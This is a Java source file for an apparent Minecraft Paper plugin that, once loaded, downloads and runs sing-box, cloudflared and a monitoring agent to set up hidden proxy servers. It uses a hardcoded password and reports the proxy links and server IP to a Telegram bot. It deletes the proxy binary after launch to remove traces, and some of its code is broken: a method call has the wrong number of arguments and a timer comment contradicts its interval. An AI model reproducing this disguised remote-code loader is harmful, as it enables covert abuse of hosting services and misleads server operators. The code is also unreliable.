package io.papermc.paper;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.stream.Collectors;
import java.util.concurrent.TimeUnit;
import java.util.regex.*;

public class PaperPlugin extends JavaPlugin {

    // ========== 全局变量 ==========
    private static final Path UUID_FILE = Paths.get("data/uuid.txt");
    private String uuid;
    private Process singboxProcess;
    private Process komariProcess;
    private Process argoProcess;
    private String argoUrl = "";
    private Path baseDir;
    private Path configJson;
    private Path cert;
    private Path key;
    private boolean komariAgentEnabled = false;
    // ==============================

    @Override
    public void onEnable() {
        saveDefaultConfig(); // 复制内置 config.yml 到 plugins/Bettermix/config.yml
        reloadConfig();

        getLogger().info("loading config.yml...");

        try {
            // 使用 Bukkit 原生 config API
            var config = getConfig();

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(config.getString("uuid", ""));
            getLogger().info("当前使用的 UUID: " + uuid);
            // --------------------------------------------

            String tuicPort = config.getString("tuic_port", "");
            String hy2Port = config.getString("hy2_port", "");
            String realityPort = config.getString("reality_port", "");
            String sni = config.getString("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2)
                throw new RuntimeException("❌ 未设置任何协议端口！");

            baseDir = getDataFolder().toPath().resolve(".singbox");
            Files.createDirectories(baseDir);
            configJson = baseDir.resolve("config.json");
            cert = baseDir.resolve("cert.pem");
            key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve("sing-box");
            Path realityKeyFile = getDataFolder().toPath().resolve("reality.key");

            getLogger().info("✅ config.yml 加载成功");

            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);

            // === 固定 Reality 密钥 ===
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                    }
                    getLogger().info("🔑 已加载本地 Reality 密钥对（固定公钥）");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile,
                            "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
                    getLogger().info("✅ Reality 密钥已保存到 reality.key");
                }
            }
            boolean argoEnabled = config.getBoolean("argo_enabled", false);
            String argoPort = trim(config.getString("argo_port", "8001"));
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key,
                    privateKey, publicKey, argoEnabled, argoPort);

            // 保存 sing-box 进程 + 启动每日 00:03 重启
            singboxProcess = startSingBox(bin, configJson);
            // 启动后删除二进制，保留 config/cert/key 供定时重启使用
            try {
                if (Files.exists(bin)) Files.delete(bin);
                getLogger().info("🧹 已清除 sing-box 二进制");
            } catch (IOException e) {
                getLogger().warning("⚠️ 清除 sing-box 二进制失败: " + e.getMessage());
            }
            scheduleDailyRestart(bin, configJson);

            // ===== komari-agent 集成 =====
            komariAgentEnabled = config.getBoolean("komari_agent_enabled", true);
            if (komariAgentEnabled) {
                String agentName = config.getString("komari_agent_name", "agent");
                String agentVer = config.getString("komari_agent_ver", "");
                String agentEndpoint = config.getString("komari_agent_endpoint", "");
                String agentKey = config.getString("komari_agent_key", "");
                if (!agentEndpoint.isEmpty() && !agentKey.isEmpty()) {
                    getLogger().info("📦 " + agentName + " v" + agentVer);
                    safeDownloadKomariAgent(baseDir, agentName);
                    komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
                    startKomariKeepalive(baseDir, agentName, agentEndpoint, agentKey);
                } else {
                    getLogger().info("⏭️ komari-agent 未配置（config.yml 中 komari_agent_endpoint/komari_agent_key 为空）");
                }
            } else {
                getLogger().info("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
            }
            // ==============================

            // ===== Argo 隧道 =====
            if (argoEnabled) {
                String argoToken = trim(config.getString("argo_token", ""));
                String argoDomain = trim(config.getString("argo_domain", ""));
                String argoName = trim(config.getString("argo_name", "argo-tunnel"));
                getLogger().info("🚇 Argo 隧道已启用");
                safeDownloadArgo(baseDir, argoName);
                argoProcess = startArgo(baseDir, argoName, argoToken, argoPort);
                if (!argoToken.isEmpty() && !argoDomain.isEmpty()) {
                    argoUrl = argoDomain;
                    getLogger().info("🚇 Argo 固定隧道域名: " + argoUrl);
                }
                startArgoKeepalive(baseDir, argoName, argoToken, argoPort);
            }
            // ==========================

            String host = detectPublicIP();
            String nodePrefix = config.getString("node_name", "");
            String argoCfip = config.getString("argo_cfip", "saas.sin.fan");
            printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey, argoUrl, argoCfip);

            // ===== Telegram 推送 =====
            String tgToken = config.getString("tg_bot_token", "");
            String tgChatId = config.getString("tg_chat_id", "");
            if (!tgToken.isEmpty() && !tgChatId.isEmpty()) {
                String nodeName = getNodeName(nodePrefix, host);
                String nodeText = buildTelegramNodes(uuid, host, nodeName, deployVLESS, deployTUIC, deployHY2,
                        tuicPort, hy2Port, realityPort, sni, publicKey, argoCfip, argoUrl);
                sendTelegramMessage(tgToken, tgChatId, host, nodeName, nodeText);
            }
            // ==========================

            getLogger().info("✅ " + getName() + " v" + getDescription().getVersion() + " 已启动");

        } catch (Exception e) {
            getLogger().severe("启动失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("正在停止所有子进程...");

        if (argoProcess != null && argoProcess.isAlive()) {
            getLogger().info("正在停止 argo 隧道 (PID: " + argoProcess.pid() + ")...");
            argoProcess.destroy();
        }

        if (komariProcess != null && komariProcess.isAlive()) {
            getLogger().info("正在停止 komari-agent (PID: " + komariProcess.pid() + ")...");
            komariProcess.destroy();
        }

        if (singboxProcess != null && singboxProcess.isAlive()) {
            getLogger().info("正在停止 sing-box (PID: " + singboxProcess.pid() + ")...");
            singboxProcess.destroy();
        }

        if (baseDir != null) {
            // 只清理临时文件，保留二进制方便下次启动
            try {
                if (Files.exists(configJson)) Files.delete(configJson);
                if (Files.exists(cert)) Files.delete(cert);
                if (Files.exists(key)) Files.delete(key);
            } catch (IOException ignored) {}
}
	    }

	    // ========== UUID ==========
    private String generateOrLoadUUID(String configUuid) {
        String cfg = trim(configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }
        try {
            Path file = getDataFolder().toPath().resolve(UUID_FILE);
            if (Files.exists(file)) {
                String saved = Files.readString(file).trim();
                if (isValidUUID(saved)) {
                    getLogger().info("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            getLogger().warning("读取 UUID 文件失败: " + e.getMessage());
        }
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        getLogger().info("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private void saveUuidToFile(String uuid) {
        try {
            Path file = getDataFolder().toPath().resolve(UUID_FILE);
            Files.createDirectories(file.getParent());
            Files.writeString(file, uuid);
        } catch (Exception e) {
            getLogger().warning("保存 UUID 失败: " + e.getMessage());
        }
    }

    private boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    // ===== 工具函数 =====
    private String trim(String s) { return s == null ? "" : s.trim(); }

    // ===== 证书生成 =====
    private void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            getLogger().info("🔑 证书已存在，跳过生成");
            return;
        }
        getLogger().info("🔨 正在生成 EC 自签证书...");
        new ProcessBuilder("sh", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        getLogger().info("✅ 已生成自签证书");
    }

    // ===== Reality 密钥生成 =====
    private Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        getLogger().info("🔑 正在生成 Reality 密钥对...");
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find()) throw new IOException("Reality 密钥生成失败：" + out);
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        getLogger().info("✅ Reality 密钥生成完成");
        return map;
    }

    // ===== 配置生成 =====
    private void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                       String tuicPort, String hy2Port, String realityPort,
                                       String sni, Path cert, Path key,
                                       String privateKey, String publicKey,
                                       boolean argoEnabled, String argoPort) throws IOException {

        List<String> inbounds = new ArrayList<>();

        // Argo 专用 VMess WebSocket 入站（Argo 隧道只能转发 HTTP/WS 流量）
        if (argoEnabled) {
            inbounds.add("""
              {
                "type": "vmess",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s"}],
                "transport": {
                  "type": "ws",
                  "path": "/vmess-argo",
                  "early_data_header_name": "Sec-WebSocket-Protocol"
                }
              }
            """.formatted(argoPort, uuid));
        }

        if (tuic) {
            inbounds.add("""
              {
                "type": "tuic",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "password": "eishare2025"}],
                "congestion_control": "bbr",
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(tuicPort, uuid, cert, key));
        }

        if (hy2) {
            inbounds.add("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "up_mbps": 1000,
                "down_mbps": 1000,
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "insecure": true,
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(hy2Port, uuid, cert, key));
        }

        if (vless) {
            inbounds.add("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true,
                  "server_name": "%s",
                  "reality": {
                    "enabled": true,
                    "handshake": {"server": "%s", "server_port": 443},
                    "private_key": "%s",
                    "short_id": [""]
                  }
                }
              }
            """.formatted(realityPort, uuid, sni, sni, privateKey));
        }

        String json = """
        {
          "log": { "level": "info" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """.formatted(String.join(",", inbounds));

        Files.writeString(configFile, json);
        getLogger().info("✅ sing-box 配置生成完成");
    }

    // ===== 版本检测 =====
    private String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    getLogger().info("🔍 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            getLogger().warning("⚠️ 获取版本失败，使用回退版本 " + fallback);
        }
        return fallback;
    }

    // ===== 下载 sing-box =====
    private void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
        if (Files.exists(bin)) return;
        String arch = detectArch();
        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;

        getLogger().info("⬇️ 下载 sing-box: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("sh", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("sh", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");

        if (Files.exists(tar)) {
            Files.delete(tar);
            getLogger().info("🧹 已删除 sing-box 压缩包以释放空间");
        }

        getLogger().info("✅ 成功解压 sing-box 可执行文件");
    }

    private String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    // ===== 启动 sing-box =====
    private Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
        getLogger().info("正在启动 sing-box...");
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread.sleep(1500);
        getLogger().info("sing-box 已启动，PID: " + p.pid());
        return p;
    }

    // ===== komari-agent 下载 =====
    private void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);
        if (Files.exists(agentPath)) {
            getLogger().info("🧹 清理已存在的 agent 文件...");
            Files.delete(agentPath);
        }
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir, "sing-box-*.tar.gz")) {
            for (Path f : ds) {
                Files.delete(f);
                getLogger().info("🧹 已删除缓存: " + f.getFileName());
            }
        }
        String arch = detectArch();
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
        getLogger().info("⬇️ 下载 " + agentName + " (" + arch + "): " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath);
        }
        if (!Files.exists(agentPath) || Files.size(agentPath) == 0) {
            throw new IOException("❌ komari-agent 下载失败，文件为空或不存在！");
        }
        agentPath.toFile().setExecutable(true, false);
        if (!agentPath.toFile().canExecute()) {
            throw new IOException("❌ komari-agent 无法设置执行权限！");
        }
        getLogger().info("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
    }

    // ===== komari-agent 启动 =====
    private Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);
        getLogger().info("正在启动 " + agentName + " -> " + endpoint);
        Process p;
        try {
            ProcessBuilder pb = new ProcessBuilder(agentPath.toString(), "-e", endpoint, "--auto-discovery", autoDiscovery);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        } catch (IOException e) {
            getLogger().warning("⚠️ 直接执行失败，尝试通过 sh 启动: " + e.getMessage());
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "\"" + agentPath + "\" -e '" + endpoint + "' --auto-discovery '" + autoDiscovery + "'");
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        }
        Thread.sleep(1000);
        if (!p.isAlive()) {
            throw new IOException("❌ komari-agent 启动后立即退出");
        }
        getLogger().info("✅ " + agentName + " 已启动，PID: " + p.pid());
        return p;
    }

    // ===== komari-agent 保活 =====
    private void startKomariKeepalive(Path dir, String agentName, String endpoint, String autoDiscovery) {
        Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
            try {
                if (komariProcess != null && komariProcess.isAlive()) return;

                getLogger().info("♻️ komari-agent 已退出，正在重启...");
                Path agentPath = dir.resolve(agentName);
                if (!Files.exists(agentPath)) {
                    safeDownloadKomariAgent(dir, agentName);
                }
                komariProcess = startKomariAgent(dir, agentName, endpoint, autoDiscovery);
                getLogger().info("✅ komari-agent 重启成功，PID: " + komariProcess.pid());
            } catch (Exception e) {
                getLogger().warning("❌ komari-agent 重启失败: " + e.getMessage());
            }
        }, 0L, 20L * 60); // 每 60 秒检查一次（20 tick = 1秒）
    }

    // ===== Argo 隧道下载 =====
    private void safeDownloadArgo(Path dir, String name) throws IOException, InterruptedException {
        Path argoPath = dir.resolve(name);
        if (Files.exists(argoPath)) {
            getLogger().info("🧹 清理已存在的 " + name + " 文件...");
            Files.delete(argoPath);
        }
        String arch = detectArch();
        String url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
        getLogger().info("⬇️ 下载 argo 隧道 (" + arch + "): " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, argoPath);
        }
        if (!Files.exists(argoPath) || Files.size(argoPath) == 0) {
            throw new IOException("❌ cloudflared 下载失败！");
        }
        argoPath.toFile().setExecutable(true, false);
        if (!argoPath.toFile().canExecute()) {
            throw new IOException("❌ cloudflared 无法设置执行权限！");
        }
        getLogger().info("✅ " + name + " 下载完成 (" + Files.size(argoPath) + " bytes)");
    }

    // ===== Argo 隧道启动 =====
    private Process startArgo(Path dir, String name, String token, String port) throws IOException, InterruptedException {
        Path argoPath = dir.resolve(name);
        getLogger().info("🚇 正在启动 Argo 隧道...");
        ProcessBuilder pb;
        if (!token.isEmpty()) {
            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "run", "--token", token);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        } else {
            if (port.isEmpty()) port = "8001";
            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "--url", "http://localhost:" + port);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
        }
        Process p = pb.start();
        Thread.sleep(3000);
        if (!p.isAlive()) {
            throw new IOException("❌ Argo 隧道启动后立即退出");
        }
        getLogger().info("✅ Argo 隧道已启动，PID: " + p.pid());

        // 提取临时隧道域名
        if (token.isEmpty()) {
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                long timeout = System.currentTimeMillis() + 8000;
                while (System.currentTimeMillis() < timeout && (line = reader.readLine()) != null) {
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile("https://[a-zA-Z0-9.-]+\\.trycloudflare\\.com").matcher(line);
                    if (m.find()) {
                        String domain = m.group();
                        if (domain.startsWith("https://")) domain = domain.substring(8);
                        argoUrl = domain;
                        getLogger().info("🚇 Argo 临时隧道域名: " + argoUrl);
                        break;
                    }
                }
            } catch (Exception e) {
                getLogger().warning("⚠️ 提取 Argo 域名失败: " + e.getMessage());
            }
        }
        return p;
    }

    // ===== Argo 隧道保活 =====
    private void startArgoKeepalive(Path dir, String name, String token, String port) {
        Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
            try {
                if (argoProcess != null && argoProcess.isAlive()) return;
                getLogger().info("♻️ Argo 隧道已退出，正在重启...");
                Path argoPath = dir.resolve(name);
                if (!Files.exists(argoPath)) {
                    safeDownloadArgo(dir, name);
                }
                argoProcess = startArgo(dir, name, token, port);
                getLogger().info("✅ Argo 隧道重启成功，PID: " + argoProcess.pid());
            } catch (Exception e) {
                getLogger().warning("❌ Argo 隧道重启失败: " + e.getMessage());
            }
        }, 0L, 20L * 60);
    }

    // ===== 输出节点 =====
    private String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://ipinfo.io/ip").openStream()))) {
                return br.readLine();
            } catch (Exception e2) {
                return "your-server-ip";
            }
        }
    }

    private String getNodeName(String name, String host) {
        String isp = fetchISP();
        return name.isEmpty() ? isp : name + "-" + isp;
    }

    private String fetchISP() {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile("\"country_code\":\"([^\"]*)\"").matcher(json);
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("\"isp\":\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) {
                    return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
                }
            }
        } catch (Exception ignored) {}
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://ip-api.com/json?fields=33280").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile("\"countryCode\":\"([^\"]*)\"").matcher(json);
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("\"org\":\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) {
                    return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
                }
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    private void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                    String tuicPort, String hy2Port, String realityPort,
                                    String sni, String host, String publicKey, String argoUrl, String argoCfip) {
        getLogger().info("\n=== ✅ 已部署节点链接 ===");
        if (vless)
            getLogger().info("VLESS Reality:\nvless://" + uuid + "@" + host + ":" + realityPort + "?encryption=none&flow=xtls-rprx-vision&security=reality&sni=" + sni + "&fp=chrome&pbk=" + publicKey + "#VLESS-Reality");
        if (tuic)
            getLogger().info("TUIC:\ntuic://" + uuid + ":eishare2025@" + host + ":" + tuicPort + "?sni=" + sni + "&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC");
        if (hy2)
            getLogger().info("Hysteria2:\nhysteria2://" + uuid + "@" + host + ":" + hy2Port + "?sni=" + sni + "&insecure=1#Hysteria2");
        if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
            String node = buildVmessArgoLink(uuid, argoUrl, argoCfip);
            getLogger().info("\nVMess Argo:\n" + node);
        }
    }

    // ===== VMess Argo 节点链接生成（base64 JSON 格式，可粘贴到 v2rayN）=====
    private String buildVmessArgoLink(String uuid, String argoDomain, String argoCfip, String nodeName) {
        try {
            String json = "{\"v\":\"2\",\"ps\":\"" + nodeName + "-Argo\",\"add\":\"" + argoCfip + "\",\"port\":\"443\",\"id\":\""
                    + uuid + "\",\"aid\":\"0\",\"scy\":\"auto\",\"net\":\"ws\",\"type\":\"none\",\"host\":\""
                    + argoDomain + "\",\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\""
                    + argoDomain + "\",\"alpn\":\"\",\"fp\":\"firefox\"}";
            return "vmess://" + java.util.Base64.getEncoder().encodeToString(json.getBytes());
        } catch (Exception e) {
            return "vmess://(error: " + e.getMessage() + ")";
        }
    }

    // ===== Telegram 推送 =====
    private String buildTelegramNodes(String uuid, String host, String nodeName,
                                       boolean vless, boolean tuic, boolean hy2,
                                       String tuicPort, String hy2Port, String realityPort,
                                       String sni, String publicKey,
                                       String argoCfip, String argoUrl) {
        StringBuilder sb = new StringBuilder();

        // 直连节点（不走 Argo）
        if (vless) {
            sb.append("vless://").append(uuid).append("@").append(host).append(":").append(realityPort);
            sb.append("?encryption=none&flow=xtls-rprx-vision&security=reality&sni=").append(sni);
            sb.append("&fp=chrome&pbk=").append(publicKey).append("&type=tcp&headerType=none").append("#").append(nodeName).append("-Reality\n");
        }
        if (tuic) {
            sb.append("tuic://").append(uuid).append(":eishare2025@").append(host).append(":").append(tuicPort);
            sb.append("?sni=").append(sni).append("&alpn=h3&congestion_control=bbr&allowInsecure=1").append("#").append(nodeName).append("-TUIC\n");
        }
        if (hy2) {
            sb.append("hysteria2://").append(uuid).append("@").append(host).append(":").append(hy2Port);
            sb.append("?sni=").append(sni).append("&insecure=1&alpn=h3&obfs=none").append("#").append(nodeName).append("-Hysteria2\n");
        }
        // VMess Argo 节点（通过 Cloudflare 隧道）
        if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
            String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, nodeName);
            sb.append(node).append("\n");
        }
        return sb.toString().trim();
    }

    private void sendTelegramMessage(String token, String chatId, String serverIP, String nodeName, String nodeText) {
        try {
            String b64 = java.util.Base64.getEncoder().encodeToString(nodeText.getBytes(StandardCharsets.UTF_8));
            String text = "✅ 节点已就绪 | " + nodeName + "\n" +
                    "🌍 IP: " + serverIP + "\n\n" +
                    "<pre>" + b64.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") + "</pre>";

            String json = "{\"chat_id\":" + (chatId.startsWith("@") ? "\"" + URLEncoder.encode(chatId, StandardCharsets.UTF_8) + "\"" : chatId)
                    + ",\"parse_mode\":\"HTML\"," +
                    "\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";

            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/json");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int code = conn.getResponseCode();
            if (code == 200) {
                getLogger().info("📨 Telegram 推送成功");
            } else {
                try (BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {
                    getLogger().warning("⚠️ Telegram 推送失败，HTTP " + code + " — " + err.lines().collect(Collectors.joining()));
                }
            }
        } catch (Exception e) {
            getLogger().warning("⚠️ Telegram 推送异常: " + e.getMessage());
        }
    }

    // ===== 每日北京时间 00:03 重启 sing-box =====
    private void scheduleDailyRestart(Path bin, Path cfg) {
        new BukkitRunnable() {
            @Override
            public void run() {
                ZoneId zone = ZoneId.of("Asia/Shanghai");
                LocalDateTime now = LocalDateTime.now(zone);
                LocalDateTime target = now.withHour(0).withMinute(3).withSecond(0).withNano(0);
                if (!target.isAfter(now)) target = target.plusDays(1);
                long delay = Duration.between(now, target).toMillis();

                Bukkit.getScheduler().runTaskLater(PaperPlugin.this, () -> {
                    getLogger().info("[定时重启Sing-box] 北京时间 00:03，准备重启 sing-box...");

                    if (singboxProcess != null && singboxProcess.isAlive()) {
                        getLogger().info("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
                        singboxProcess.destroy();
                        try {
                            if (!singboxProcess.waitFor(10, TimeUnit.SECONDS)) {
                                getLogger().info("进程未响应，强制终止...");
                                singboxProcess.destroyForcibly();
                            }
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                        }
                    }

                    try {
                        // 重新下载 sing-box（之前已被删除）
                        String version = fetchLatestSingBoxVersion();
                        safeDownloadSingBox(version, bin, cfg.getParent());
                        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
                        pb.redirectErrorStream(true);
                        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                        singboxProcess = pb.start();
                        getLogger().info("sing-box 重启成功，新 PID: " + singboxProcess.pid());
                        // 启动后再次删除痕迹
                        try {
                            if (Files.exists(bin)) Files.delete(bin);
                        } catch (IOException ignored) {}
                    } catch (Exception e) {
                        getLogger().severe("重启失败: " + e.getMessage());
                    }
                }, delay / 50); // 转换为 tick
            }
        }.runTaskTimerAsynchronously(this, 0L, 20L * 3600 * 24); // 每小时检查一次
    }

    private void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}